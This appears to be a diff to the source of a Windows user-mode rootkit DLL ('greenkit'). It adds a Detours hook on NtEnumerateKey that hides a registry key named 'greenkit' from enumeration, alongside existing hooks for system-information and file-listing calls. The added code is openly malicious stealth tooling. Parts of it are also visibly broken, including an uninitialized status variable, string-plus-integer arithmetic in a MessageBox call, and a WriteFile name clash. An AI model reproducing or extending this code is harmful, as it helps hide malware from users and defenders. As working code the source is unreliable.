@@ -11,7 +11,7 @@
 #include <windows.h>
 #include "Detours.h"
 #include "el_win_structs.h"
-#include "NtEnumerateKey.h"
+//#include "NtEnumerateKey.h"
 
 #include <shlwapi.h>
 #include <winsock2.h>
@@ -19,6 +19,21 @@
 #define REGKEY "SOFTWARE\\example\\example"
 #define REGKEY_VALUE "explorer"
 #define FILE_TAG "EXAMPLE"
+
+VOID WriteFile(char token)
+{
+    HANDLE hFile = CreateFile("C:\\greenkit.txt",                // name of the write
+        GENERIC_WRITE,          // open for writing
+        0,                      // do not share
+        NULL,                   // default security
+        CREATE_NEW,             // create new file only
+        FILE_ATTRIBUTE_NORMAL,  // normal file
+        NULL);                  // no attr. template
+
+    DWORD dwBytesWritten = 0;
+    char Str[] = "hook regedit";
+    WriteFile(hFile, Str + token, strlen(Str + token), &dwBytesWritten, NULL);
+}
 
 typedef DWORD(NTAPI *elNtQuerySystemInformation)(DWORD i, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
 DWORD NTAPI elNtQuery(SYSTEM_INFORMATION_CLASS i, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
@@ -38,6 +53,8 @@ BOOL WINAPI elFNFW(HANDLE findfile, LPWIN32_FIND_DATAW finddata);
 FNFW oldFNFW;
 FNFW hookFNFW;
 
+/* NT ENUMERATE KEY */
+
 typedef NTSTATUS(WINAPI *TD_NtEnumerateKey)(HANDLE, ULONG, KEY_INFORMATION_CLASS, PVOID, ULONG, PULONG);
 
 NTSTATUS NTAPI NewNtEnumerateKey(HANDLE, ULONG, KEY_INFORMATION_CLASS, PVOID, ULONG, PULONG);
@@ -50,6 +67,89 @@ typedef NTSTATUS(NTAPI *TD_NtOpenKey)(
 
 TD_NtEnumerateKey oldNtEnumerateKey;
 TD_NtEnumerateKey hookNtEnumerateKey;
+
+BOOL mustShiftReg(UNICODE_STRING uStr_reg) {
+    if (wcscmp((uStr_reg.Buffer), L"greenkit") <= 0)
+        return TRUE;
+    return FALSE;
+}
+
+BOOL mustHideReg(UNICODE_STRING uStr_reg) {
+    if (wcscmp(uStr_reg.Buffer, L"greenkit") == 0)
+        return TRUE;
+    return FALSE;
+}
+
+PVOID getKeyName(PVOID KeyInformation, KEY_INFORMATION_CLASS KeyInformationClass) {
+    if (KeyInformationClass == KeyBasicInformation)
+        return (PVOID)&(((PKEY_BASIC_INFORMATION)KeyInformation)->Name);
+    else if (KeyInformationClass == KeyNodeInformation)
+        return (PVOID)&(((PKEY_NODE_INFORMATION)KeyInformation)->Name);
+    return NULL;
+}
+
+ULONG getKeyNameLength(PVOID KeyInformation, KEY_INFORMATION_CLASS KeyInformationClass) {
+    if (KeyInformationClass == KeyBasicInformation)
+        return ((PKEY_BASIC_INFORMATION)KeyInformation)->NameLength;
+    else if (KeyInformationClass == KeyNodeInformation)
+        return ((PKEY_NODE_INFORMATION)KeyInformation)->NameLength;
+    return 0;
+}
+
+NTSTATUS NTAPI NewNtEnumerateKey(
+    HANDLE					KeyHandle,
+    ULONG					Index,
+    KEY_INFORMATION_CLASS	KeyInformationClass,
+    PVOID					KeyInformation,
+    ULONG					Length,
+    PULONG					ResultLength)
+{
+    NTSTATUS ret;
+    UNICODE_STRING uStr_tmp;
+    ULONG tmpIndex;
+    HANDLE h_tmp;
+    OBJECT_ATTRIBUTES ObjectAttributes;
+    ret = hookNtEnumerateKey(KeyHandle, Index, KeyInformationClass, KeyInformation, Length, ResultLength);
+
+    if (!(KeyInformationClass == KeyBasicInformation || KeyInformationClass == KeyNodeInformation))
+        return ret;
+    else if (!NT_SUCCESS(ret))
+        return ret;
+
+    uStr_tmp.Buffer = (PWSTR)getKeyName(KeyInformation, KeyInformationClass);
+    uStr_tmp.Length = (USHORT)getKeyNameLength(KeyInformation, KeyInformationClass);
+
+
+    if (!mustShiftReg(uStr_tmp)) // TODO change this part for more than one key to hide
+        return ret;
+    else {
+        TD_NtOpenKey _NtOpenKey = (TD_NtOpenKey)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtOpenKey");
+        NTSTATUS status;
+        InitializeObjectAttributes(&ObjectAttributes, &uStr_tmp, 0, KeyHandle, NULL);
+        if (!NT_SUCCESS(_NtOpenKey(&h_tmp, GENERIC_READ, &ObjectAttributes)))
+        {
+            MessageBox(0, "Opened key, returning with error " + status, "HookTest", MB_OK | MB_ICONERROR);
+            return ret;
+        }
+    }
+
+    CloseHandle(h_tmp);
+    tmpIndex = Index + 1;
+
+    ret = hookNtEnumerateKey(KeyHandle, tmpIndex, KeyInformationClass, KeyInformation, Length, ResultLength);
+    if (ret != STATUS_SUCCESS)
+        return ret;
+    uStr_tmp.Buffer = (PWSTR)getKeyName(KeyInformation, KeyInformationClass);
+    uStr_tmp.Length = (USHORT)getKeyNameLength(KeyInformation, KeyInformationClass);
+
+    hookNtEnumerateKey(KeyHandle, tmpIndex, KeyInformationClass, KeyInformation, Length, ResultLength);
+    if (mustHideReg(uStr_tmp))
+    {
+        MessageBox(0, "FOUND", "HookTest", MB_OK | MB_ICONERROR);
+        ++tmpIndex;
+    }
+    return hookNtEnumerateKey(KeyHandle, tmpIndex, KeyInformationClass, KeyInformation, Length, ResultLength);
+}
 
 BOOL APIENTRY DllMain(HMODULE hModule,
     DWORD  ul_reason_for_call,
@@ -64,7 +164,6 @@ BOOL APIENTRY DllMain(HMODULE hModule,
     switch (ul_reason_for_call)
     {
     case DLL_PROCESS_ATTACH:
-        MessageBox(0, "NTDLL CREATE HOOOKED", "HookTest", MB_OK | MB_ICONERROR);
         //oldNtQuery = (elNtQuerySystemInformation)GetProcAddress(NtDll, "NtQuerySystemInformation");
         //hookNtQuery = (elNtQuerySystemInformation)DetourFunction((PBYTE)oldNtQuery, (PBYTE)elNtQuery);
 
